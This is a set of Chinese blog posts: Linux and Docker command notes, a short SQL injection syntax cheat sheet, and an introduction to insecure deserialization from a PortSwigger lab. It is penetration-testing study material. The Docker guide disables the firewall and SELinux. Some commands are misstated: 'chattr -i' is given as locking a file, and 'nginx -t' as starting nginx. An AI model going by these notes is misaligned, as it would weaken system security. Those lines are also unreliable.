class="comment">#修改用户是否能登录（创建虚拟用户）</span></span><br><span class="line">-l	 <span class="comment">#指定新的用户名</span></span><br><span class="line">-d	 <span class="comment">#可选参数，同时修改用户的家目录路径</span></span><br><span class="line">-m	 <span class="comment">#与 -d 配合使用，将原家目录内容移动到新路径</span></span><br><span class="line">usermod -l newuser -d /home/newuser -m olduser</span><br><span class="line"></span><br><span class="line"><span class="comment">#chown:修改文件属主和属组</span></span><br><span class="line"><span class="built_in">chown</span> root /var/log/httpd.log     <span class="comment"># 更改文件所有者为root</span></span><br><span class="line"><span class="built_in">chown</span> :staff /home/user/file.txt  <span class="comment"># 仅更改文件所属组为staff</span></span><br><span class="line"><span class="built_in">chown</span> user1:group1 /data/project  <span class="comment"># 同时更改目录的所有者和组</span></span><br><span class="line"><span class="built_in">chown</span>  -R  主:组 文件               <span class="comment">#递归更改目录及其所有子文件、子目录的所有权</span></span><br><span class="line">-h                                <span class="comment">#仅更改符号链接本身的所有权，而非其指向的目标文件。</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#gpasswd</span></span><br><span class="line">gpasswd -a 用户 组	<span class="comment">#添加用户到组</span></span><br><span class="line">gpasswd -d 用户 组	<span class="comment">#从组中删除用户</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#chattr</span></span><br><span class="line">chattr -i          <span class="comment">#重要文件上锁</span></span><br><span class="line">chattr -i p        <span class="comment">#解锁（可以将命令名称改名，这样黑客就不知道怎么解锁了）</span></span><br></pre></td></tr></table></figure>
<h2 id="磁盘管理">磁盘管理</h2>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#1 du</span></span><br><span class="line"><span class="built_in">du</span> -sh filePath   <span class="comment">#文件存储到磁盘所占的空间（block）</span></span><br><span class="line"><span class="comment">#查看文件大小</span></span><br><span class="line"><span class="built_in">du</span> -h</span><br><span class="line"><span class="built_in">du</span> -ah</span><br><span class="line"><span class="comment">#查看分区</span></span><br><span class="line"><span class="built_in">df</span> -h</span><br><span class="line"></span><br><span class="line"><span class="comment">#df [选项] [文件或设备]</span></span><br><span class="line">-h    <span class="comment">#以人类可读的格式显示磁盘空间大小</span></span><br><span class="line">-T    <span class="comment">#显示文件系统类型</span></span><br><span class="line">-i    <span class="comment">#显示 inode 信息</span></span><br><span class="line"><span class="built_in">df</span>    <span class="comment">#显示磁盘空间大小</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#mount 挂载硬盘</span></span><br><span class="line"><span class="comment">#umount 取消挂载</span></span><br></pre></td></tr></table></figure>
<h2 id="vim使用">vim使用</h2>
<p>普通模式:</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">yy     <span class="comment">#复制光标所在行</span></span><br><span class="line">nyy    <span class="comment">#数字yy 复制连续多行内容</span></span><br><span class="line">p      <span class="comment">#粘贴复制/剪切的内容</span></span><br><span class="line">np     <span class="comment">#粘贴n次复制/剪切的内容 </span></span><br><span class="line"><span class="built_in">dd</span>     <span class="comment">#删除光标所在行</span></span><br><span class="line">ndd    <span class="comment">#删除n行</span></span><br><span class="line">D	   <span class="comment">#删除本行内容，但是保留空行</span></span><br><span class="line">dG     <span class="comment">#删除光标所在位置后的所有行内容</span></span><br><span class="line">G      <span class="comment">#光标跳转到最后一行</span></span><br><span class="line">gg	   <span class="comment">#光标跳转到第一行</span></span><br><span class="line">nG     <span class="comment">#光标跳转到第n行</span></span><br><span class="line">$      <span class="comment">#光标跳转当前行的末尾</span></span><br><span class="line">0      <span class="comment">#光标跳转到当前行的开头</span></span><br><span class="line">Ctrl+u <span class="comment">#undo</span></span><br><span class="line">ctrl+r <span class="comment">#redo</span></span><br></pre></td></tr></table></figure>
<p>末行模式(命令模式)：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">:/要检索的内容      <span class="comment">#检索</span></span><br><span class="line">: %s/root/ROOT/g <span class="comment">#替换</span></span><br><span class="line">:<span class="built_in">set</span> nu          <span class="comment">#显示行号 </span></span><br><span class="line">:q               <span class="comment">#不保存退出</span></span><br><span class="line">:q!              <span class="comment">#强制不保存退出</span></span><br><span class="line">:wq              <span class="comment">#保存退出</span></span><br><span class="line">:wq!             <span class="comment">#强制保存退出</span></span><br><span class="line">:e!              <span class="comment">#恢复到最初状态</span></span><br><span class="line">:w a.txt         <span class="comment">#另存为</span></span><br><span class="line">:w &gt;&gt; a.txt      <span class="comment">#内容追加到a.txt</span></span><br></pre></td></tr></table></figure>
<p>每次进入vi就有行号编辑文件<code>.vimc</code>添加<code>set nu</code></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">vi ~/.vimrc</span><br><span class="line"><span class="built_in">set</span> nu</span><br></pre></td></tr></table></figure>
<link rel="stylesheet" href="/css/spoiler.css" type="text/css"><script src="/js/spoiler.js" type="text/javascript" async></script>]]></content>
      <categories>
        <category>基础知识</category>
        <category>Linux</category>
        <category>Linux基础</category>
      </categories>
      <tags>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title>【Linux】docker安装</title>
    <url>/posts/b1246162/</url>
    <content><![CDATA[<h2 id="docker安装">docker安装</h2>
<ol>
<li class="lvl-3"><strong>关闭安全程序</strong></li>
</ol>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">systemctl stop firewalld</span><br><span class="line">systemctl stop iptables</span><br><span class="line">systemctl <span class="built_in">disable</span> firewalld</span><br><span class="line">systemctl <span class="built_in">disable</span> iptable</span><br><span class="line">iptables -F</span><br><span class="line"></span><br><span class="line">查看selinux是否关闭</span><br><span class="line">getenforce </span><br><span class="line">如果看到是disabled就说明关闭了</span><br><span class="line">如果看到enforcing就证明开着</span><br><span class="line"></span><br><span class="line">修改</span><br><span class="line">sed -i <span class="string">&#x27;7s#enforcing#disabled#g&#x27;</span> /etc/selinux/config</span><br><span class="line">生效</span><br><span class="line">setenforce 0</span><br></pre></td></tr></table></figure>
<ol start="2">
<li class="lvl-3">
<p><strong>让时间同步</strong></p>
</li>
</ol>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">yum install -y ntp ntpdate</span><br><span class="line">ntpdate cn.pool.ntp.org</span><br><span class="line"></span><br><span class="line">执行计划任务</span><br><span class="line">crontab -e</span><br><span class="line">* * * * * /usr/sbin/ntpdate  cn.pool.ntp.org &amp;&gt;/dev/null</span><br><span class="line"></span><br><span class="line">重启计划任务</span><br><span class="line">systemctl restart crond</span><br></pre></td></tr></table></figure>
<ol start="3">
<li class="lvl-3">
<p><strong>安装基础依赖程序</strong></p>
</li>
</ol>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">yum clean all &amp;&amp; yum makecache</span><br><span class="line">yum install -y device-mapper-persistent-data lvm2 wget net-tools nfs-utils lrzsz gcc gcc-c++ make cmake libxml2-devel openssl-devel curl curl-devel unzip <span class="built_in">sudo</span> ntp libaio-devel wget vim ncurses-devel autoconf automake zlib-devel  python-devel epel-release openssh-server socat  ipvsadm conntrack telnet ipvsadm  yum-utils</span><br></pre></td></tr></table></figure>
<ol start="4">
<li class="lvl-3">
<p><strong>安装阿里云docker源</strong></p>
</li>
</ol>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">yum-config-manager --add-repo http://mirrors.aliyun.com/docker-ce/linux/centos/docker-ce.repo</span><br><span class="line"></span><br><span class="line">安装docker：</span><br><span class="line">yum install docker-ce -y</span><br><span class="line"></span><br><span class="line">安装完毕后可以执行</span><br><span class="line">docker version</span><br><span class="line">查看docker版本</span><br><span class="line"></span><br><span class="line">启动并开机运行docker</span><br><span class="line">systemctl start docker &amp;&amp; systemctl <span class="built_in">enable</span> docker</span><br><span class="line"></span><br><span class="line">检查docker是否启动成功</span><br><span class="line">systemctl status docker</span><br><span class="line">看到running就是成功了</span><br></pre></td></tr></table></figure>
<ol start="5">
<li class="lvl-3">
<p><strong>修改内核参数</strong></p>
</li>
</ol>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">modprobe br_netfilter</span><br><span class="line"><span class="built_in">cat</span> &gt; /etc/sysctl.d/docker.conf &lt;&lt;<span class="string">EOF</span></span><br><span class="line"><span class="string">net.bridge.bridge-nf-call-ip6tables = 1</span></span><br><span class="line"><span class="string">net.bridge.bridge-nf-call-iptables = 1</span></span><br><span class="line"><span class="string">net.ipv4.ip_forward = 1</span></span><br><span class="line"><span class="string">EOF</span></span><br><span class="line"></span><br><span class="line">修改完查看确认无误</span><br><span class="line"><span class="built_in">cat</span> /etc/sysctl.d/docker.conf</span><br><span class="line"></span><br><span class="line">生效：</span><br><span class="line">sysctl -p /etc/sysctl.d/docker.conf</span><br><span class="line"></span><br><span class="line">确认内核状态</span><br><span class="line">lsmod | grep br_netfilter</span><br><span class="line"></span><br><span class="line">重启后会失效，为了防止此情况</span><br><span class="line">vim /etc/sysconfig/modules/br_netfilter.modules</span><br><span class="line">编写内容：</span><br><span class="line">modprobe br_netfilter</span><br><span class="line">保存退出</span><br><span class="line"></span><br><span class="line">给他执行权限</span><br><span class="line"><span class="built_in">chmod</span> +x /etc/sysconfig/modules/br_netfilter.modules</span><br><span class="line"></span><br><span class="line">创建一个脚本文件：</span><br><span class="line">vim /etc/rc.sysinit</span><br><span class="line">内容：</span><br><span class="line"><span class="comment">#!/bin/bash</span></span><br><span class="line"><span class="keyword">for</span> file <span class="keyword">in</span> /etc/sysconfig/modules/*.modules</span><br><span class="line"><span class="keyword">do</span></span><br><span class="line">  [ -x <span class="variable">$file</span> ] &amp;&amp; <span class="variable">$file</span></span><br><span class="line"><span class="keyword">done</span></span><br><span class="line">保存退出</span><br><span class="line">可以通过reboot命令重启服务器查看是否生效</span><br></pre></td></tr></table></figure>
<p>本文参考：</p>
<link rel="stylesheet" href="/css/spoiler.css" type="text/css"><script src="/js/spoiler.js" type="text/javascript" async></script>]]></content>
      <categories>
        <category>基础知识</category>
        <category>Linux</category>
        <category>Linux进阶</category>
      </categories>
  </entry>
  <entry>
    <title>【Linux】docker使用</title>
    <url>/posts/4c00139f/</url>
    <content><![CDATA[<h2 id="镜像操作">镜像操作</h2>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#能够连接镜像仓库情况下：</span></span><br><span class="line">docker search centos  <span class="comment">#找到相关镜像</span></span><br><span class="line"><span class="comment">#然后：</span></span><br><span class="line">docker pull centos  <span class="comment">#将镜像直接下载到docker里面</span></span><br><span class="line">docker images  <span class="comment">#查看镜像</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#现在docker官方镜像仓库不可用，只能使用离线镜像：</span></span><br><span class="line"><span class="comment">#如何使用离线镜像：</span></span><br><span class="line"><span class="comment">#首先将镜像上传到服务器</span></span><br><span class="line">rz -be上传镜像文件</span><br><span class="line"><span class="comment">#上传完毕后，上载到docker里</span></span><br><span class="line"><span class="comment">#容器镜像压缩包不要用tar命令进行解压，要用docker load加载及解压镜像压缩包</span></span><br><span class="line">docker load -i centos.tar.gz</span><br><span class="line"></span><br><span class="line"><span class="comment">#查看镜像：</span></span><br><span class="line">docker images</span><br><span class="line"><span class="comment">#删除镜像：</span></span><br><span class="line">docker rmi [镜像名字]或[镜像ID] [镜像名字]或[镜像ID] ......</span><br></pre></td></tr></table></figure>
<h2 id="镜像加速">镜像加速</h2>
<p>我用了国内镜像源也没用，最后用的本机代理。如果有代理的话直接用代理吧。</p>
<p><strong>更改国内源：</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">sudo</span> <span class="built_in">mkdir</span> -p /etc/docker</span><br><span class="line">vim /etc/docker/daemon.json</span><br><span class="line">添加如下内容：</span><br><span class="line">&#123;</span><br><span class="line">    <span class="string">&quot;registry-mirrors&quot;</span>:[<span class="string">&quot;https://a88u1jg4.mirror.aliyuncs.com&quot;</span>,<span class="string">&quot;https://docker.lmirror.top&quot;</span>,<span class="string">&quot;https://docker.m.daocloud.io&quot;</span>,<span class="string">&quot;https://hub.uuuabc.top&quot;</span>,<span class="string">&quot;https://docker.anyhub.us.kg&quot;</span>,<span class="string">&quot;https://dockerhub.jobcher.com&quot;</span>,<span class="string">&quot;https://dockerhub.icu&quot;</span>,<span class="string">&quot;https://docker.ckyl.me&quot;</span>,<span class="string">&quot;https://docker.awsl9527.cn&quot;</span>,<span class="string">&quot;https://docker.laoex.link&quot;</span>]</span><br><span class="line">&#125;</span><br><span class="line">保存退出</span><br><span class="line">systemctl daemon-reload</span><br><span class="line">systemctl restart docker</span><br></pre></td></tr></table></figure>
<p><strong>使用代理：</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">sudo</span> <span class="built_in">mkdir</span> -p /etc/systemd/system/docker.service.d</span><br><span class="line">vim /etc/systemd/system/docker.service.d/http-proxy.conf</span><br><span class="line"></span><br><span class="line"><span class="comment">#添加内容：</span></span><br><span class="line">[Service]</span><br><span class="line">Environment=<span class="string">&quot;HTTP_PROXY=http://user:password@ip:port/&quot;</span></span><br><span class="line">Environment=<span class="string">&quot;HTTPS_PROXY=http://user:password@ip:port/&quot;</span></span><br><span class="line">Environment=<span class="string">&quot;NO_PROXY=localhost,127.0.0.1,.example.com&quot;</span></span><br><span class="line"><span class="comment">#注意改成自己的代理ip和端口，如果没有密码去掉“user:password@”</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#刷新配置并重启 docker 服务</span></span><br><span class="line"><span class="built_in">sudo</span> systemctl daemon-reload</span><br><span class="line"><span class="built_in">sudo</span> systemctl restart docker</span><br></pre></td></tr></table></figure>
<h2 id="容器操作：">容器操作：</h2>
<p>基础操作：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#进入一个镜像容器</span></span><br><span class="line">docker run --name 容器名称（自己取） -it centos(镜像的名称) /bin/bash(调用环境)</span><br><span class="line"><span class="comment">#退出容器</span></span><br><span class="line"><span class="built_in">exit</span></span><br><span class="line">此时退出后，容器就会停止运行</span><br><span class="line"></span><br><span class="line"><span class="comment">#查看所有的容器，包括停止的</span></span><br><span class="line">docker ps -a </span><br><span class="line"></span><br><span class="line"><span class="comment">#删除容器</span></span><br><span class="line">docker <span class="built_in">rm</span> [镜像名字]或[镜像ID]  <span class="comment">#（名称不能重复）</span></span><br><span class="line"><span class="comment">#守护形式容器（-d 不会退出就关闭）</span></span><br><span class="line">docker run --name=xiaoA -td centos /bin/bash</span><br><span class="line"></span><br><span class="line"><span class="comment">#查看正在运行的容器</span></span><br><span class="line">docker ps</span><br><span class="line"></span><br><span class="line"><span class="comment">#进入正在运行的容器</span></span><br><span class="line">docker <span class="built_in">exec</span> -it xiaoA /bin/bash</span><br><span class="line"><span class="comment">#开启</span></span><br><span class="line">docker start 容器名（容器ID） 容器名（容器ID） ......</span><br><span class="line"><span class="comment">#重启</span></span><br><span class="line">docker restart 容器名（容器ID） 容器名（容器ID） ......</span><br><span class="line"><span class="comment">#停止容器</span></span><br><span class="line">docker stop 容器名（容器ID） 容器名（容器ID） ......</span><br><span class="line"><span class="comment">#强制停止正在运行的容器：</span></span><br><span class="line">docker <span class="built_in">kill</span> 容器名（容器ID） 容器名（容器ID） ......</span><br><span class="line"><span class="comment">#关闭所有容器：</span></span><br><span class="line">docker stop $(docker ps -a -q)</span><br><span class="line"><span class="comment">#删除所有容器：</span></span><br><span class="line">docker <span class="built_in">rm</span> $(docker ps -a -q)</span><br><span class="line"><span class="comment">#删除所有镜像</span></span><br><span class="line">docker rmi $(docker images -q)</span><br><span class="line"><span class="comment">#查看容器日志</span></span><br><span class="line">docker logs 容器名（容器ID）</span><br></pre></td></tr></table></figure>
<p>拓展：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker <span class="built_in">cp</span> sourcePath <span class="variable">$&#123;containerId&#125;</span>:destinationPath <span class="comment">#宿主机拷贝到容器</span></span><br><span class="line">docker <span class="built_in">cp</span> <span class="variable">$&#123;containerId&#125;</span>:sourcePath destinationPath <span class="comment">#容器拷贝到宿主机</span></span><br><span class="line">docker commit <span class="variable">$&#123;containerId&#125;</span> imageName:version      <span class="comment">#保存一个容器为镜像</span></span><br><span class="line">docker save -o destinationPath imageName            <span class="comment">#保存image方便传输</span></span><br><span class="line">docker load -i sourcePath                           <span class="comment">#加载一个文件到image</span></span><br></pre></td></tr></table></figure>
<h2 id="文件持久化存储">文件持久化存储</h2>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#创建一个目录</span></span><br><span class="line"><span class="built_in">mkdir</span> ~/xiaoX_data</span><br><span class="line"><span class="comment">#新建一个容器</span></span><br><span class="line">docker run --name xiaoC -v ~/xiaoX_data:/data -itd centos /bin/bash</span><br><span class="line"><span class="comment">#进入容器</span></span><br><span class="line">docker <span class="built_in">exec</span> -it xiaoC /bin/bash</span><br><span class="line"><span class="built_in">cd</span> /data</span><br><span class="line"><span class="comment">#创建一些文件</span></span><br><span class="line"><span class="built_in">echo</span> abc &gt;&gt; 1.txt</span><br><span class="line"><span class="comment">#通过另一个终端，可以看到文件会出现在/root/xiaoX_data/下面</span></span><br><span class="line"><span class="comment">#所以该文件不会丢失</span></span><br></pre></td></tr></table></figure>
<h2 id="如何创建自定义容器">如何创建自定义容器</h2>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#先创建一个放dockerfile的文件夹</span></span><br><span class="line"><span class="built_in">mkdir</span> -p /root/dockerfile/inter-image</span><br><span class="line"><span class="comment">#进入创建的文件夹</span></span><br><span class="line"><span class="built_in">cd</span> /root/dockerfile/inter-image </span><br><span class="line"><span class="comment">#创建dockerfile（必须叫这个名字）</span></span><br><span class="line"><span class="built_in">touch</span> dockerfile</span><br></pre></td></tr></table></figure>
<p>老师给的<code>dockerfile</code>内容如下：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">FROM centos</span><br><span class="line">RUN sed -i <span class="string">&quot;s|mirrorlist=|#mirrorlist=|g&quot;</span> /etc/yum.repos.d/CentOS-*</span><br><span class="line">RUN sed -i <span class="string">&quot;s|#baseurl=http://mirror.centos.org|baseurl=http://vault.centos.org|g&quot;</span> /etc/yum.repos.d/CentOS-*</span><br><span class="line">RUN yum install wget -y</span><br><span class="line">RUN yum install nginx -y</span><br><span class="line">EXPOSE 80</span><br><span class="line">CMD /bin/bash</span><br></pre></td></tr></table></figure>
<p>但是我一直下载不了<code>centos:latest</code>，所以做了改动：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">FROM centos:7</span><br><span class="line"><span class="comment"># 修复基础仓库地址</span></span><br><span class="line">RUN sed -i \</span><br><span class="line">    -e <span class="string">&quot;s|mirrorlist=|#mirrorlist=|g&quot;</span> \</span><br><span class="line">    -e <span class="string">&quot;s|#baseurl=http://mirror.centos.org|baseurl=http://vault.centos.org|g&quot;</span> \</span><br><span class="line">    /etc/yum.repos.d/CentOS-*</span><br><span class="line"><span class="comment"># 安装 EPEL 仓库（nginx所在仓库）</span></span><br><span class="line">RUN yum install -y epel-release</span><br><span class="line"><span class="comment"># 安装所需软件（合并命令减少层数）</span></span><br><span class="line">RUN yum install -y wget nginx</span><br><span class="line">EXPOSE 80</span><br><span class="line">CMD /bin/bash  <span class="comment"># 保持前台运行</span></span><br></pre></td></tr></table></figure>
<p>保存上面内容后退出</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker build -t <span class="string">&quot;inter-image&quot;</span> .  <span class="comment">#构建镜像</span></span><br></pre></td></tr></table></figure>
<p>构建完毕以后该镜像就会生成到docker里</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker images  <span class="comment">#查看镜像</span></span><br><span class="line">docker save -o 名字.tar.gz 镜像名字 </span><br><span class="line">docker save -o inter-image.tar.gz inter-image </span><br><span class="line">docker run --name inter-image -v ~/dataxiaoE:/data -itd inter-image  /bin/bash <span class="comment">#构建一个容器</span></span><br><span class="line">docker <span class="built_in">exec</span> -it inter-image /bin/bash <span class="comment">#进入容器</span></span><br><span class="line">/usr/sbin/nginx -t  <span class="comment">#开启nginx服务</span></span><br><span class="line">ip a</span><br><span class="line">curl ip:80  <span class="comment">#访问到nginx欢迎页面</span></span><br><span class="line"><span class="built_in">exit</span>  <span class="comment">#退出</span></span><br></pre></td></tr></table></figure>
<h2 id="容器之间互联">容器之间互联</h2>
<h3 id="ip互联">ip互联</h3>
<p>基于上面创建的inter-image镜像分别启动容器test1和test2，并进入到容器中。</p>
<p>查询ip地址即可互联</p>
<p><img src="/posts/4c00139f//image-20250710214550350-17521567889481.png" alt="image-20250710214550350"></p>
<p>开启nginx服务后也可以通过 <code>curl</code> 命令连</p>
<p><img src="/posts/4c00139f//image-20250710220009917-17521567983984.png" alt="image-20250710220009917"></p>
<h3 id="网络别名互联">网络别名互联</h3>
<p>定义网络别名（防止容器ip变化了，导致我们访问不到）</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker run --name test3 -td inter-image  <span class="comment">#创建一个测试容器</span></span><br><span class="line">docker run --name test4 -td --<span class="built_in">link</span>=test3:webtest inter-image  <span class="comment">#创建别名容器</span></span><br><span class="line">docker <span class="built_in">exec</span> -it test4 /bin/bash  <span class="comment">#进入别名容器</span></span><br><span class="line">ping webtest <span class="comment">#就可以无视test3容器IP变化</span></span><br></pre></td></tr></table></figure>
<p><img src="/posts/4c00139f//image-20250710205010145-175215682419010.png" alt="image-20250710205010145"></p>
<h2 id="docker的网络权限">docker的网络权限</h2>
<p>host模式：</p>
<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">docker run --name host -it --net=host --privileged=true centos:<span class="number">7</span></span><br><span class="line">ip a  <span class="comment">#发现和本机的IP一样</span></span><br><span class="line"><span class="keyword">exit</span>  <span class="comment">#退出</span></span><br><span class="line">docker rm host  <span class="comment">#删除容器</span></span><br></pre></td></tr></table></figure>
<p>none模式：</p>
<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">docker run -td --name none --net=none --privileged=true centos:<span class="number">7</span></span><br><span class="line">docker exec -it none <span class="regexp">/bin/</span>bash</span><br><span class="line">ip a  <span class="comment">#发现只有lo网卡</span></span><br><span class="line"><span class="keyword">exit</span>  <span class="comment">#退出</span></span><br></pre></td></tr></table></figure>
<h2 id="如何判断是否为docker环境">如何判断是否为docker环境</h2>
<p>可以通过：<code>cat /proc/1/cgroup</code>命令查看内容</p>
<p><img src="/posts/4c00139f//image-20250710223300288.png" alt="image-20250710223300288"></p>
<p>也可以通过<code>ls -alh /.dockerenv</code>查看是否有容器环境文件</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[root@92a79e791862 /]# <span class="built_in">ls</span> -a /</span><br><span class="line">.   .dockerenv         bin   dev  home  lib64  mnt  proc  run   srv  tmp  var</span><br><span class="line">..  anaconda-post.log  boot  etc  lib   media  opt  root  sbin  sys  usr</span><br><span class="line">[root@92a79e791862 /]# <span class="built_in">ls</span> -a /.dockerenv  </span><br><span class="line">/.dockerenv</span><br></pre></td></tr></table></figure>
<p>本文参考：</p>
<link rel="stylesheet" href="/css/spoiler.css" type="text/css"><script src="/js/spoiler.js" type="text/javascript" async></script>]]></content>
      <categories>
        <category>基础知识</category>
        <category>Linux</category>
        <category>Linux进阶</category>
      </categories>
  </entry>
  <entry>
    <title>【SQL注入】语法示例</title>
    <url>/posts/180be885/</url>
    <content><![CDATA[<p>本 SQL 注入小抄包含有用语法的示例，您可以使用这些语法执行各种任务，这些任务在执行 SQL 注入攻击时经常会出现。</p>
<h2 id="String-concatenation">String concatenation</h2>
<p>只有一个列时可以将多个字符串连接成一个字符串。</p>
<table>
<thead>
<tr>
<th>Database type</th>
<th>Query</th>
</tr>
</thead>
<tbody>
<tr>
<td>Oracle</td>
<td>‘foo’||‘bar’</td>
</tr>
<tr>
<td>Microsoft</td>
<td><code>'foo'+'bar'</code></td>
</tr>
<tr>
<td>PostgreSQL</td>
<td>‘foo’||‘bar’</td>
</tr>
<tr>
<td>MySQL</td>
<td><code>'foo' 'bar'</code> <br><code>CONCAT('foo','bar')</code></td>
</tr>
</tbody>
</table>
<h2 id="Substring">Substring</h2>
<p>您可以从指定长度的指定偏移量中提取字符串的一部分。请注意，偏移索引是以 1 为单位的。以下每个表达式都将返回字符串 ba。</p>
<table>
<thead>
<tr>
<th>Database type</th>
<th>Query</th>
</tr>
</thead>
<tbody>
<tr>
<td>Oracle</td>
<td><code>SUBSTR('foobar', 4, 2)</code></td>
</tr>
<tr>
<td>Microsoft</td>
<td><code>SUBSTRING('foobar', 4, 2)</code></td>
</tr>
<tr>
<td>PostgreSQL</td>
<td><code>SUBSTRING('foobar', 4, 2)</code></td>
</tr>
<tr>
<td>MySQL</td>
<td><code>SUBSTRING('foobar', 4, 2)</code></td>
</tr>
</tbody>
</table>
<h2 id="Comments">Comments</h2>
<p>可以使用注释来截断查询（也可以用别的），并删除原始查询中跟随您输入的部分。</p>
<p>本文参考：</p>
<link rel="stylesheet" href="/css/spoiler.css" type="text/css"><script src="/js/spoiler.js" type="text/javascript" async></script>]]></content>
      <categories>
        <category>渗透测试</category>
        <category>SQL注入</category>
      </categories>
  </entry>
  <entry>
    <title>【PortSwigger靶场】反序列化</title>
    <url>/posts/bea7d250/</url>
    <content><![CDATA[<h2 id="不安全的反序列化">不安全的反序列化</h2>
<p>在本节中，我们将介绍什么是不安全的反序列化，并描述不安全的反序列化如何可能使网站遭受严重攻击。我们将重点介绍典型场景，并使用 PHP、Ruby 和 Java 反序列化的具体示例演示一些广泛适用的技术。我们还将介绍一些可以避免自己的网站出现不安全反序列化漏洞的方法。</p>
<h2 id="什么是序列化？">什么是序列化？</h2>
<p>序列化是将复杂的数据结构（如对象及其字段）转换为 “flatter” 格式的过程，这种格式可以作为连续的字节流发送和接收。数据序列化使以下工作变得更加简单：</p>
<ul class="lvl-0">
<li class="lvl-2">
<p>将复杂数据写入进程间内存、文件或数据库</p>
</li>
<li class="lvl-2">
<p>通过网络、应用程序不同组件之间或 API 调用等方式发送复杂数据</p>
</li>
</ul>
<p>最重要的是，在序列化对象时，其状态也会被持久化。换句话说，对象的属性及其赋值都会被保留下来。</p>
<h3 id="序列化与反序列化">序列化与反序列化</h3>
<p>反序列化是将字节流还原为原始对象的全功能复制品的过程，其状态与序列化时完全相同。然后，网站的逻辑就可以与这个反序列化对象交互，就像与其他对象交互一样。</p>
<p>许多编程语言都为序列化提供本地支持。具体如何序列化对象取决于语言。有些语言将对象序列化为二进制格式，而其他语言则使用不同的字符串格式，其可读性也各不相同。请注意，原始对象的所有属性都会存储在序列化数据流中，包括任何私有字段。要防止某个字段被序列化，必须在类声明中将其明确标记为 “transient” 字段。</p>
<p>请注意，在使用不同的编程语言时，序列化可能被称为 marshalling（Ruby）或 pickling（Python）。这些术语在此处与 “serialization” 同义。</p>
<h2 id="什么是不安全的反序列化？">什么是不安全的反序列化？</h2>
<p>不安全的反序列化是指网站对用户可控数据进行反序列化。这有可能使攻击者操纵序列化对象，从而将有害数据传递到应用程序代码中。</p>
<p>甚至有可能将序列化后的对象替换为完全不同类的对象。令人担忧的是，网站可用的任何类的对象都会被反序列化和实例化，而不管预期的是哪个类。因此，不安全的反序列化有时被称为 “对象注入 ”漏洞。</p>
<p>一个意外类的对象可能会导致异常。不过，此时破坏可能已经造成。许多基于反序列化的攻击都是在反序列化完成之前完成的。这意味着，即使网站本身的功能不直接与恶意对象交互，反序列化过程本身也可能发起攻击。因此，逻辑基于强类型语言的网站也容易受到这些技术的攻击。</p>
<h2 id="不安全的反序列化漏洞是如何产生的？">不安全的反序列化漏洞是如何产生的？</h2>
<p>不安全的反序列化通常是因为人们普遍缺乏对反序列化用户可控数据的危险性的认识。理想情况下，用户输入根本不应该被反序列化。</p>
<p>不过，有时网站所有者会认为自己很安全，因为他们对反序列化数据实施了某种形式的额外检查。这种方法往往是无效的，因为几乎不可能实施验证或消毒来应对每一种可能发生的情况。这些检查从根本上说也是有缺陷的，因为它们依赖于在数据被反序列化后对其进行检查，而在许多情况下，这已经太晚了，无法阻止攻击。</p>
<p>由于通常认为反序列化对象是可信的，因此也可能出现漏洞。特别是在使用二进制序列化格式的语言时，开发人员可能会认为用户无法有效地读取或操作数据。然而，虽然可能需要付出更多努力，但攻击者利用二进制序列化对象的可能性与利用基于字符串格式的对象的可能性一样大。</p>
<p>现代网站中存在大量依赖关系，这也使得基于反序列化的攻击成为可能。一个典型的网站可能实现了许多不同的库，每个库都有自己的依赖关系。这就形成了一个庞大的类和方法池，很难对其进行安全管理。由于攻击者可以创建任何这些类的实例，因此很难预测在恶意数据上可以调用哪些方法。如果攻击者能够将一长串意想不到的方法调用串联起来，将数据传递到与初始源完全无关的汇中，情况就更是如此。因此，要预测恶意数据流并堵住每个潜在漏洞几乎是不可能的。</p>
<p>简而言之，可以说不可能安全地反序列化不受信任的输入。</p>
<h2 id="不安全的反序列化会产生什么影响？">不安全的反序列化会产生什么影响？</h2>
<p>不安全的反序列化可能会造成非常严重的影响，因为它为大量增加的攻击面提供了一个切入点。它允许攻击者以有害的方式重复使用现有的应用程序代码，导致许多其他漏洞，通常是远程代码执行。</p>
<p>即使在不可能执行远程代码的情况下，不安全的反序列化也会导致权限升级、任意文件访问和拒绝服务攻击。</p>
<h2 id="如何利用不安全的反序列化漏洞">如何利用不安全的反序列化漏洞</h2>
<p>现在您已经熟悉了序列化和反序列化的基础知识，我们可以看看如何利用不安全的反序列化漏洞。</p>
<h2 id="利用不安全的反序列化漏洞">利用不安全的反序列化漏洞</h2>
<p>在本节中，我们将以 PHP、Ruby 和 Java 反序列化为例，教您如何利用一些常见情况。我们希望展示利用不安全的反序列化实际上比许多人想象的要容易得多。如果您能够使用预构建的小工具链，甚至在黑盒测试中可以做到这一点。</p>
